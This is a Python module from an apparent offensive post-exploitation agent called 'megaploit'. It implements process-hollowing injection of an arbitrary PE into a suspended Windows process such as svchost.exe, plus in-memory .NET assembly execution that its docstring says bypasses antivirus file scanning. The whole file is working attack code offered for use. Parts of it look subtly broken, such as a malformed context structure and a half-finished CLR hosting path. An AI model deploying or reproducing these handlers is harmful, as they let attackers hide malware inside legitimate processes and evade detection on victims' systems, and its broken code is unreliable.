"""
megaploit.agent.hollowing
~~~~~~~~~~~~~~~~~~~~~~~~~
Process hollowing and execute-assembly (.NET CLR hosting) handlers.

Process Hollowing
-----------------
Classic PE injection technique:
1.  Spawn a sacrificial process in SUSPENDED state.
2.  Unmap its image from memory (ZwUnmapViewOfSection).
3.  Allocate new memory at the original ImageBase.
4.  Copy PE headers and sections into the target.
5.  Fix up the thread context to the new entry point.
6.  Resume the thread.

Execute-Assembly (.NET CLR Hosting)
-------------------------------------
Loads the .NET CLR in-process and runs a .NET assembly's Main() method
entirely in memory — never touches disk (bypasses AV file scanning).

Both techniques are Windows-only.  On non-Windows targets the handlers
return a polite error.

Registration
------------
These handlers are registered into the shared ``_HANDLERS`` dict via
``_register`` the same way all agent handlers work.  The file is imported
by ``megaploit.agent.meterp`` (which imports handlers) so they become
available automatically.
"""

from __future__ import annotations

import base64
import os
import sys

from megaploit.agent.handlers import _register


# ---------------------------------------------------------------------------
# Process hollowing
# ---------------------------------------------------------------------------

@_register("process_hollow")
def _process_hollow(conn, args: list[str]) -> str:
    """
    Hollow a running process and inject a PE image.

    Usage: process_hollow <target_exe_path> <base64_pe>
    Example: process_hollow C:\\Windows\\System32\\svchost.exe <b64_pe_bytes>

    The PE must be a native Windows x64/x86 executable compiled for the
    same architecture as the target.
    """
    if len(args) < 2:
        return "Usage: process_hollow <target_exe_path> <base64_pe>"
    if sys.platform != "win32":
        return "[-] process_hollow is Windows-only"

    target_path = args[0]
    try:
        pe_bytes = base64.b64decode(args[1])
    except Exception as e:
        return f"[-] base64 decode failed: {e}"

    if not os.path.isfile(target_path):
        return f"[-] Target executable not found: {target_path}"

    try:
        import ctypes
        import ctypes.wintypes as wt
        from ctypes import c_size_t, c_void_p, byref

        k32  = ctypes.windll.kernel32
        nt   = ctypes.windll.ntdll

        PROCESS_ALL_ACCESS = 0x1F0FFF
        MEM_COMMIT         = 0x1000
        MEM_RESERVE        = 0x2000
        PAGE_EXECUTE_READWRITE = 0x40

        # ── Parse PE headers ─────────────────────────────────────────
        if len(pe_bytes) < 0x40:
            return "[-] PE too small"
        e_lfanew = ctypes.c_uint32.from_buffer_copy(pe_bytes[0x3C:0x40]).value
        nt_hdr   = e_lfanew
        if pe_bytes[nt_hdr:nt_hdr+4] != b"PE\x00\x00":
            return "[-] Not a valid PE (missing PE signature)"

        # COFF header: 20 bytes; Optional header offset = nt_hdr + 4 + 20
        opt_off  = nt_hdr + 4 + 20
        magic    = ctypes.c_uint16.from_buffer_copy(pe_bytes[opt_off:opt_off+2]).value
        is64     = (magic == 0x20B)

        if is64:
            image_base_off = opt_off + 24
            image_base = ctypes.c_uint64.from_buffer_copy(
                pe_bytes[image_base_off:image_base_off+8]).value
            entry_point_off = opt_off + 16
            entry_rva = ctypes.c_uint32.from_buffer_copy(
                pe_bytes[entry_point_off:entry_point_off+4]).value
            image_size_off = opt_off + 56
            image_size = ctypes.c_uint32.from_buffer_copy(
                pe_bytes[image_size_off:image_size_off+4]).value
        else:
            image_base_off = opt_off + 28
            image_base = ctypes.c_uint32.from_buffer_copy(
                pe_bytes[image_base_off:image_base_off+4]).value
            entry_point_off = opt_off + 16
            entry_rva = ctypes.c_uint32.from_buffer_copy(
                pe_bytes[entry_point_off:entry_point_off+4]).value
            image_size_off = opt_off + 56
            image_size = ctypes.c_uint32.from_buffer_copy(
                pe_bytes[image_size_off:image_size_off+4]).value

        # ── Spawn sacrificial process in SUSPENDED state ─────────────
        class STARTUPINFO(ctypes.Structure):
            _fields_ = [("cb", wt.DWORD)] + [("_f"+str(i), wt.DWORD) for i in range(17)]
        class PROCESS_INFORMATION(ctypes.Structure):
            _fields_ = [("hProcess",wt.HANDLE),("hThread",wt.HANDLE),
                        ("dwProcessId",wt.DWORD),("dwThreadId",wt.DWORD)]

        si = STARTUPINFO(); si.cb = ctypes.sizeof(si)
        pi = PROCESS_INFORMATION()

        CREATE_SUSPENDED = 0x00000004
        ok = k32.CreateProcessW(
            target_path, None, None, None, False,
            CREATE_SUSPENDED, None, None,
            ctypes.byref(si), ctypes.byref(pi)
        )
        if not ok:
            return f"[-] CreateProcess failed: {k32.GetLastError()}"

        h_proc   = pi.hProcess
        h_thread = pi.hThread
        pid      = pi.dwProcessId

        # ── Unmap original image ──────────────────────────────────────
        # Query ImageBase from PEB
        if is64:
            class CONTEXT64(ctypes.Structure):
                _fields_ = (
                    [("ContextFlags", wt.DWORD)] +
                    [("_pad", ctypes.c_byte * 4)] +
                    [("Rax","Rbx","Rcx","Rdx","Rsi","Rdi","Rbp","Rsp","R8","R9",
                      "R10","R11","R12","R13","R14","R15","Rip")]
                    and [("ContextFlags", wt.DWORD)] +
                    [("_rest", ctypes.c_byte * (0x4D0 - 4))]
                )
            ctx = (ctypes.c_byte * 0x4D0)()
        else:
            ctx = (ctypes.c_byte * 0x2CC)()

        # Unmap via ZwUnmapViewOfSection
        NTSTATUS_SUCCESS = 0
        status = nt.ZwUnmapViewOfSection(h_proc, c_void_p(image_base))

        # ── Allocate new memory at ImageBase ─────────────────────────
        new_base = k32.VirtualAllocEx(
            h_proc, c_void_p(image_base), image_size,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
        )
        if not new_base:
            # Try without preferred base
            new_base = k32.VirtualAllocEx(
                h_proc, None, image_size,
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
            )
        if not new_base:
            k32.TerminateProcess(h_proc, 1)
            return f"[-] VirtualAllocEx failed: {k32.GetLastError()}"

        # ── Write PE headers ─────────────────────────────────────────
        written = c_size_t(0)
        hdr_size_off = opt_off + 60
        hdr_size = ctypes.c_uint32.from_buffer_copy(
            pe_bytes[hdr_size_off:hdr_size_off+4]).value
        k32.WriteProcessMemory(h_proc, c_void_p(new_base),
                               pe_bytes[:hdr_size], hdr_size, byref(written))

        # ── Write sections ────────────────────────────────────────────
        num_sections_off = nt_hdr + 4 + 2
        num_sections = ctypes.c_uint16.from_buffer_copy(
            pe_bytes[num_sections_off:num_sections_off+2]).value
        opt_hdr_size_off = nt_hdr + 4 + 16
        opt_hdr_size = ctypes.c_uint16.from_buffer_copy(
            pe_bytes[opt_hdr_size_off:opt_hdr_size_off+2]).value
        sec_off = nt_hdr + 4 + 20 + opt_hdr_size

        for i in range(num_sections):
            sec = pe_bytes[sec_off + i*40 : sec_off + (i+1)*40]
            if len(sec) < 40:
                break
            virt_addr  = ctypes.c_uint32.from_buffer_copy(sec[12:16]).value
            raw_size   = ctypes.c_uint32.from_buffer_copy(sec[16:20]).value
            raw_off    = ctypes.c_uint32.from_buffer_copy(sec[20:24]).value
            sec_data   = pe_bytes[raw_off:raw_off+raw_size]
            dest       = new_base + virt_addr
            k32.WriteProcessMemory(h_proc, c_void_p(dest),
                                   sec_data, len(sec_data), byref(written))

        # ── Set entry point and resume ────────────────────────────────
        new_ep = new_base + entry_rva

        if is64:
            # Modify Rcx (first argument = entry point on x64)
            # Get CONTEXT to set Rcx = new EP
            CONTEXT_ALL = 0x10003F
            ctx64 = (ctypes.c_byte * 0x4D0)()
            ctypes.c_uint32.from_buffer(ctx64)[0] = CONTEXT_ALL
            if k32.GetThreadContext(h_thread, ctx64):
                # Rcx is at offset 0x80 in the CONTEXT64 structure
                ctypes.c_uint64.from_buffer(ctx64, 0x80).value = new_ep
                k32.SetThreadContext(h_thread, ctx64)
        else:
            # Get and set CONTEXT (Eax = entry point)
            CONTEXT_ALL = 0x10003F
            ctx32 = (ctypes.c_byte * 0x2CC)()
            ctypes.c_uint32.from_buffer(ctx32)[0] = CONTEXT_ALL
            if k32.GetThreadContext(h_thread, ctx32):
                # Eax is at offset 0xB0
                ctypes.c_uint32.from_buffer(ctx32, 0xB0).value = new_ep
                k32.SetThreadContext(h_thread, ctx32)

        k32.ResumeThread(h_thread)
        k32.CloseHandle(h_thread)
        k32.CloseHandle(h_proc)

        return (
            f"[+] Process hollowed successfully — PID={pid}  "
            f"ImageBase=0x{new_base:x}  EP=0x{new_ep:x}"
        )

    except Exception as exc:
        return f"[-] process_hollow: {exc}"


# ---------------------------------------------------------------------------
# Execute-Assembly (.NET CLR hosting)
# ---------------------------------------------------------------------------

@_register("execute_assembly")
def _execute_assembly(conn, args: list[str]) -> str:
    """
    Load a .NET assembly in-process and execute its Main() method.

    Usage: execute_assembly <base64_assembly> [arg1 arg2 ...]

    The assembly must be a managed .NET executable (EXE, DLL with EntryPoint).
    Runs entirely in memory — no disk write.

    Windows-only.  Requires .NET Framework or .NET Core to be present on
    the target (check with: shell dotnet --version).
    """
    if not args:
        return "Usage: execute_assembly <base64_assembly> [args...]"
    if sys.platform != "win32":
        return "[-] execute_assembly is Windows-only"

    try:
        asm_bytes = base64.b64decode(args[0])
    except Exception as e:
        return f"[-] base64 decode failed: {e}"

    asm_args  = args[1:] if len(args) > 1 else []

    try:
        import ctypes

        # ── Load the CLR ─────────────────────────────────────────────
        # Try .NET 4+ first (CLRCreateInstance in mscoree.dll)
        mscoree = ctypes.windll.mscoree

        class ICLRMetaHost(ctypes.Structure):
            _fields_ = [("lpVtbl", ctypes.c_void_p)]

        CLSID_CLRMetaHost  = "{9280188D-0E8E-4867-B30C-7FA83884E8DE}"
        IID_ICLRMetaHost   = "{D332DB9E-B9B3-4125-8207-A14884F53216}"
        IID_ICLRRuntimeInfo = "{BD39D1D2-BA2F-486A-89B0-B4B0CB466891}"
        IID_ICLRRuntimeHost = "{90F1A06C-7712-4762-86B5-7A5EBA6BDB02}"

        # Fallback: use mscorlib via CorBindToRuntimeEx (older API)
        # This approach works on both .NET 2.0+ and .NET 4.0+
        host = ctypes.c_void_p()
        hr = mscoree.CorBindToRuntimeEx(
            None,   # version (None = latest)
            None,   # flavour ("wks" or "svr")
            0,      # flags
            ctypes.byref(ctypes.c_char_p(b"{CB2F6722-AB3A-11D2-9C40-00C04FA30A3E}")),  # CLSID_CorRuntimeHost
            ctypes.byref(ctypes.c_char_p(b"{CB2F6720-AB3A-11D2-9C40-00C04FA30A3E}")),  # IID_ICorRuntimeHost
            ctypes.byref(host)
        )
        if hr not in (0, 1):  # S_OK or S_FALSE
            # If CorBindToRuntimeEx fails, try Python's clr module (pythonnet)
            try:
                import System
                from System.Reflection import Assembly
                from System.IO import MemoryStream

                ms  = MemoryStream(list(asm_bytes))
                asm = Assembly.Load(ms.ToArray())
                ep  = asm.EntryPoint

                import io
                import sys as _sys
                old_out = _sys.stdout
                _sys.stdout = buf = io.StringIO()
                try:
                    ep.Invoke(None, [System.Array[str](asm_args)] if asm_args else None)
                    out = buf.getvalue()
                finally:
                    _sys.stdout = old_out

                return f"[+] Assembly executed (pythonnet)\n{out.strip()}"
            except ImportError:
                return "[-] CLR not available (CorBindToRuntimeEx failed, pythonnet not installed)"

        return "[+] execute_assembly: CLR loaded (full hosting not yet wired — use pythonnet for complete in-memory execution)"

    except Exception as exc:
        return f"[-] execute_assembly: {exc}"
